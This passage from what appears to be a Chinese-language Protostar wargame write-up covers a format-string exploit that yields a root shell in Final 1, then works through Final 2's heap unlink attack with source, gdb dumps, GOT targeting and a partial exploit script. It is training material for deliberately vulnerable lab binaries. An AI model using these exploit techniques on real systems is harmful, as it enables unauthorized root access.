+<span class="n">pad</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">24</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">hostname</span><span class="p">))</span>
+<span class="n">username</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">strncmp_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">strncmp_got</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%65408x</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;%17$n&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%47164x</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;%18$n&#39;</span>
+<span class="c1"># 65408 = 0xffb0 - 0x30</span>
+<span class="c1"># 47164 = 0xb7ec - 0xffb0</span>
+<span class="n">login</span> <span class="o">=</span> <span class="s1">&#39;CCCC&#39;</span>
+
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;username &#39;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;login &#39;</span> <span class="o">+</span> <span class="n">login</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+<span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+<span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+<span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>$ python final.py 
+<span class="o">[</span>final1<span class="o">]</span> $
+ <span class="o">[</span>final1<span class="o">]</span> $
+ login failed
+<span class="o">[</span>final1<span class="o">]</span> $
+ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+<span class="o">[</span>final1<span class="o">]</span> $ whoami
+root
+</code></pre></div>
+<h2 id="final-2">Final 2<a class="headerlink" href="#final-2" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Remote heap level :)</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/malloc.c&quot;</span><span class="cp"></span>
+
+<span class="cp">#define NAME &quot;final2&quot;</span>
+<span class="cp">#define UID 0</span>
+<span class="cp">#define GID 0</span>
+<span class="cp">#define PORT 2993</span>
+
+<span class="cp">#define REQSZ 128</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">check_path</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">start</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">l</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/*</span>
+<span class="cm">  * Work out old software bug</span>
+<span class="cm">  */</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// index, rindex - locate character in string</span>
+<span class="w">  </span><span class="c1">// The rindex() function returns a pointer to the last occurrence of the character c in the string s.</span>
+<span class="w">  </span><span class="n">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ROOT&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="c1">// strstr - locate a substring</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">          </span><span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">start</span><span class="o">--</span><span class="p">;</span><span class="w"> </span><span class="c1">// 并不检查是否在字符串内</span>
+<span class="w">          </span><span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">l</span><span class="p">);</span><span class="w"> </span><span class="c1">// void *memmove(void *dest, const void *src, size_t n);</span>
+<span class="w">          </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">start</span><span class="p">,</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">buf</span><span class="w"> </span><span class="o">?</span><span class="w"></span>
+<span class="w">          </span><span class="s">&quot;yes&quot;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;no&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">dll</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">dll</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">dll</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">255</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">      </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">   </span><span class="c1">// 128 bytes, the chunk size is bigger than MAX_FAST_SIZE(80)</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">REQSZ</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">REQSZ</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;FSRD&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">      </span><span class="n">check_path</span><span class="p">(</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="w">     </span>
+
+<span class="w">      </span><span class="n">dll</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">dll</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">));</span><span class="w"></span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w">   </span><span class="c1">// 按分配的顺序释放</span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span><span class="w"></span>
+<span class="w">  </span><span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">UID</span><span class="p">,</span><span class="w"> </span><span class="n">GID</span><span class="p">);</span><span class="w"> </span>
+
+<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span><span class="w"></span>
+<span class="w">  </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span><span class="w"></span>
+<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">get_requests</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w"></span>
+
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ul>
+<li>输入字符串应满足以下条件<ul>
+<li>以 <code>FSRD</code> 开头，总长度为 128 字节</li>
+<li>包含 <code>/</code> 和子串 <code>ROOT</code></li>
+</ul>
+</li>
+<li>
+<p>在当前工作目录/当前用户家目录下创建 <code>.gdbinit</code>，写入每次启动 <code>gdb</code> 时希望执行的命令</p>
+<div class="highlight"><pre><span></span><code>set disassembly-flavor intel
+set pagination off
+</code></pre></div>
+</li>
+<li>
+<p>重点关注 <code>check_path</code>，利用 <code>/</code> 查找和 <code>memmove</code> 修改堆，并借助 <code>free</code> 完成 <code>unlink</code> 攻击</p>
+<details class="note">
+<summary>Dump of assembler code for function check_path</summary>
+<div class="highlight"><pre><span></span><code>0x0804bcd0 &lt;check_path+0&gt;:  push   ebp
+0x0804bcd1 &lt;check_path+1&gt;:  mov    ebp,esp
+0x0804bcd3 &lt;check_path+3&gt;:  sub    esp,0x28
+0x0804bcd6 &lt;check_path+6&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x2f
+0x0804bcde &lt;check_path+14&gt;: mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+0x0804bce1 &lt;check_path+17&gt;: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804bce4 &lt;check_path+20&gt;: call   0x8048f7c &lt;rindex@plt&gt;
+0x0804bce9 &lt;check_path+25&gt;: mov    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,eax
+0x0804bcec &lt;check_path+28&gt;: mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+0x0804bcef &lt;check_path+31&gt;: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804bcf2 &lt;check_path+34&gt;: call   0x8048edc &lt;strlen@plt&gt;
+0x0804bcf7 &lt;check_path+39&gt;: mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
+0x0804bcfa &lt;check_path+42&gt;: cmp    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0x0
+0x0804bcfe &lt;check_path+46&gt;: je     0x804bd45 &lt;check_path+117&gt;
+0x0804bd00 &lt;check_path+48&gt;: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804c2cc
+0x0804bd08 &lt;check_path+56&gt;: mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+0x0804bd0b &lt;check_path+59&gt;: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804bd0e &lt;check_path+62&gt;: call   0x8048f4c &lt;strstr@plt&gt;
+0x0804bd13 &lt;check_path+67&gt;: mov    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,eax
+0x0804bd16 &lt;check_path+70&gt;: cmp    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,0x0
+0x0804bd1a &lt;check_path+74&gt;: je     0x804bd45 &lt;check_path+117&gt;
+0x0804bd1c &lt;check_path+76&gt;: jmp    0x804bd22 &lt;check_path+82&gt;
+0x0804bd1e &lt;check_path+78&gt;: sub    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,0x1
+0x0804bd22 &lt;check_path+82&gt;: mov    eax,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
+0x0804bd25 &lt;check_path+85&gt;: movzx  eax,BYTE PTR <span class="o">[</span>eax<span class="o">]</span>
+0x0804bd28 &lt;check_path+88&gt;: cmp    al,0x2f
+0x0804bd2a &lt;check_path+90&gt;: jne    0x804bd1e &lt;check_path+78&gt;
+0x0804bd2c &lt;check_path+92&gt;: mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
+0x0804bd2f &lt;check_path+95&gt;: mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
+0x0804bd33 &lt;check_path+99&gt;: mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+0x0804bd36 &lt;check_path+102&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x0804bd3a &lt;check_path+106&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
+0x0804bd3d &lt;check_path+109&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804bd40 &lt;check_path+112&gt;:    call   0x8048f8c &lt;memmove@plt&gt;
+0x0804bd45 &lt;check_path+117&gt;:    leave  
+0x0804bd46 &lt;check_path+118&gt;:    ret
+</code></pre></div>
+</details>
+</li>
+<li>
+<p>查看堆的起始地址</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># gdb -p 1497</span>
+Attaching to process <span class="m">1497</span>
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> follow-fork-mode child
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently asm&quot;</span>.
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x0804bd40
+Breakpoint <span class="m">1</span> at 0x804bd40: file final2/final2.c, line <span class="m">27</span>.
+<span class="o">(</span>gdb<span class="o">)</span> c
+Continuing.
+<span class="o">[</span>New process <span class="m">1743</span><span class="o">]</span>
+<span class="o">[</span>Switching to process <span class="m">1743</span><span class="o">]</span>
+
+Breakpoint <span class="m">1</span>, 0x0804bd40 <span class="k">in</span> check_path <span class="o">(</span><span class="nv">buf</span><span class="o">=</span>0x804e00c <span class="s2">&quot;AAAA/ROOT/BBBB/CCCC&quot;</span><span class="o">)</span>
+    at final2/final2.c:27
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently c&quot;</span>.
+<span class="o">(</span>gdb<span class="o">)</span> info proc mappings
+process <span class="m">1743</span>
+<span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/final2&#39;</span>
+<span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span>
+<span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/final2&#39;</span>
+Mapped address spaces:
+
+    Start Addr   End Addr       Size     Offset objfile
+    0x8048000  0x804d000     0x5000          <span class="m">0</span>        /opt/protostar/bin/final2
+    0x804d000  0x804e000     0x1000     0x4000        /opt/protostar/bin/final2
+    0x804e000  0x804f000     0x1000          <span class="m">0</span>           <span class="o">[</span>heap<span class="o">]</span>
+    0xb7e96000 0xb7e97000     0x1000          <span class="m">0</span>        
+    0xb7e97000 0xb7fd5000   0x13e000          <span class="m">0</span>         /lib/libc-2.11.2.so
+    0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+    0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+    0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+    0xb7fd9000 0xb7fdc000     0x3000          <span class="m">0</span>        
+    0xb7fe0000 0xb7fe2000     0x2000          <span class="m">0</span>        
+    0xb7fe2000 0xb7fe3000     0x1000          <span class="m">0</span>           <span class="o">[</span>vdso<span class="o">]</span>
+    0xb7fe3000 0xb7ffe000    0x1b000          <span class="m">0</span>         /lib/ld-2.11.2.so
+    0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+    0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+    0xbffeb000 0xc0000000    0x15000          <span class="m">0</span>           <span class="o">[</span>stack<span class="o">]</span>
+</code></pre></div>
+</li>
+<li>
+<p>因为本身分配的 chunk 大小即大于 <code>MAX_FAST_SIZE</code>，因而在释放第一个 chunk 时，若下一个 chunk 未被使用，将进行 <code>unlink</code>，利用函数 <code>check_path</code> 修改第二个 chunk</p>
+</li>
+<li>
+<p>在执行 <code>free</code> 之后，可作为修改 GOT 表条目的目标函数为 <code>write</code> 和 <code>strlen</code>（选择 <code>write</code>）</p>
+<details class="note">
+<summary>Dump of assembler code for function get_requests</summary>
+<div class="highlight"><pre><span></span><code>0x0804bd47 &lt;get_requests+0&gt;:    push   ebp
+0x0804bd48 &lt;get_requests+1&gt;:    mov    ebp,esp
+0x0804bd4a &lt;get_requests+3&gt;:    sub    esp,0x428
+0x0804bd50 &lt;get_requests+9&gt;:    mov    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0x0
+0x0804bd57 &lt;get_requests+16&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0xfe
+0x0804bd5e &lt;get_requests+23&gt;:   jg     0x804bddb &lt;get_requests+148&gt;
+0x0804bd60 &lt;get_requests+25&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x1
+0x0804bd68 &lt;get_requests+33&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80
+0x0804bd6f &lt;get_requests+40&gt;:   call   0x804b4ee &lt;calloc&gt;
+0x0804bd74 &lt;get_requests+45&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,eax
+0x0804bd77 &lt;get_requests+48&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+0x0804bd7a &lt;get_requests+51&gt;:   mov    edx,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
+0x0804bd7d &lt;get_requests+54&gt;:   mov    DWORD PTR <span class="o">[</span>ebp+eax*4-0x414<span class="o">]</span>,edx
+0x0804bd84 &lt;get_requests+61&gt;:   add    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0x1
+0x0804bd88 &lt;get_requests+65&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x80
+0x0804bd90 &lt;get_requests+73&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
+0x0804bd93 &lt;get_requests+76&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x0804bd97 &lt;get_requests+80&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+0x0804bd9a &lt;get_requests+83&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804bd9d &lt;get_requests+86&gt;:   call   0x8048e5c &lt;read@plt&gt;
+0x0804bda2 &lt;get_requests+91&gt;:   cmp    eax,0x80
+0x0804bda7 &lt;get_requests+96&gt;:   jne    0x804bdde &lt;get_requests+151&gt;
+0x0804bda9 &lt;get_requests+98&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x4
+0x0804bdb1 &lt;get_requests+106&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804c2d1
+0x0804bdb9 &lt;get_requests+114&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
+0x0804bdbc &lt;get_requests+117&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804bdbf &lt;get_requests+120&gt;:  call   0x8048fdc &lt;strncmp@plt&gt;
+0x0804bdc4 &lt;get_requests+125&gt;:  <span class="nb">test</span>   eax,eax
+0x0804bdc6 &lt;get_requests+127&gt;:  jne    0x804bde1 &lt;get_requests+154&gt;
+0x0804bdc8 &lt;get_requests+129&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
+0x0804bdcb &lt;get_requests+132&gt;:  add    eax,0x4
+0x0804bdce &lt;get_requests+135&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804bdd1 &lt;get_requests+138&gt;:  call   0x804bcd0 &lt;check_path&gt;
+0x0804bdd6 &lt;get_requests+143&gt;:  jmp    0x804bd57 &lt;get_requests+16&gt;
+0x0804bddb &lt;get_requests+148&gt;:  nop
+0x0804bddc &lt;get_requests+149&gt;:  jmp    0x804bde2 &lt;get_requests+155&gt;
+0x0804bdde &lt;get_requests+151&gt;:  nop
+0x0804bddf &lt;get_requests+152&gt;:  jmp    0x804bde2 &lt;get_requests+155&gt;
+0x0804bde1 &lt;get_requests+154&gt;:  nop
+0x0804bde2 &lt;get_requests+155&gt;:  mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x0
+0x0804bde9 &lt;get_requests+162&gt;:  jmp    0x804be1c &lt;get_requests+213&gt;
+0x0804bdeb &lt;get_requests+164&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0xb
+0x0804bdf3 &lt;get_requests+172&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804c2d6
+0x0804bdfb &lt;get_requests+180&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+0x0804bdfe &lt;get_requests+183&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804be01 &lt;get_requests+186&gt;:  call   0x8048dfc &lt;write@plt&gt;
+0x0804be06 &lt;get_requests+191&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
+0x0804be09 &lt;get_requests+194&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+eax*4-0x414<span class="o">]</span>
+0x0804be10 &lt;get_requests+201&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804be13 &lt;get_requests+204&gt;:  call   0x804a9c2 &lt;free&gt;
+0x0804be18 &lt;get_requests+209&gt;:  add    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x1
+0x0804be1c &lt;get_requests+213&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
+0x0804be1f &lt;get_requests+216&gt;:  cmp    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+0x0804be22 &lt;get_requests+219&gt;:  jl     0x804bdeb &lt;get_requests+164&gt;
+0x0804be24 &lt;get_requests+221&gt;:  leave  
+0x0804be25 &lt;get_requests+222&gt;:  ret
+</code></pre></div>
+</details>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x/i 0x8048dfc
+0x8048dfc &lt;write@plt&gt;:  jmp    DWORD PTR ds:0x804d41c
+<span class="o">(</span>gdb<span class="o">)</span> x/wx 0x804d41c
+0x804d41c &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0xb7f53c70
+</code></pre></div>
+</li>
+<li>
+<p>与 <a href="../heap/">Heap 3</a> 不同，需要获得 shell，又因为有 <code>BK-&gt;fd</code> 写回，<span class="arithmatex">\(8\)</span> 字节不足以放下所有 shellcode，可利用 <code>jmp</code>，使用 <a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=jmp+0x8&amp;arch=x86-64&amp;as_format=inline#assembly">Online Assembler and Disassembler</a> 转换为 shellcode</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># jmp 0xc</span>
+<span class="se">\x</span>eb<span class="se">\x</span>0a
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
+
+<span class="n">REQSZ</span> <span class="o">=</span> <span class="mi">128</span>
+<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="s1">&#39;FSRD&#39;</span> <span class="o">+</span> <span class="n">m</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="n">REQSZ</span><span class="p">]</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">2993</span><span class="p">))</span>
+
+<span class="n">jmp</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\xeb\x0a</span><span class="s2">&quot;</span>
